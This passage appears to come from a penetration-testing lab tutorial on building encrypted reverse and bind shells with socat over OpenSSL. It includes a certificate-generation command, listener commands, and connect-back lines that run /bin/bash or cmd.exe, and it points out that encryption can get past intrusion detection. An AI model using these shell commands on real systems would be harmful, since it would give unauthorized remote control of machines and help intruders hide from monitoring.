One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.  

We covered how to create basic shells in the previous task, so that syntax will not be covered again here. Suffice to say that any time `TCP` was used as part of a command, this should be replaced with `OPENSSL` when working with encrypted shells. We'll cover a few examples at the end of the task, but first let's talk about certificates.

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`  
  
This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.  

We then need to merge the two created files into a single `.pem` file:

  

`cat shell.key shell.crt > shell.pem`

Now, when we set up our reverse shell listener, we use:

  

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`  

  

This sets up an OPENSSL listener using our generated certificate. `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate _must_ be used on whichever device is listening.  

  

To connect back, we would use:

  

`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

## Bind Shells
The same technique would apply for a bind shell:

  

Target:

  

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`  

  

Attacker:

  

`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`  

  

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.

  

The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:

![](https://i.imgur.com/UbOPN9q.png)

This technique will also work with the special, Linux-only TTY shell covered in the previous task --

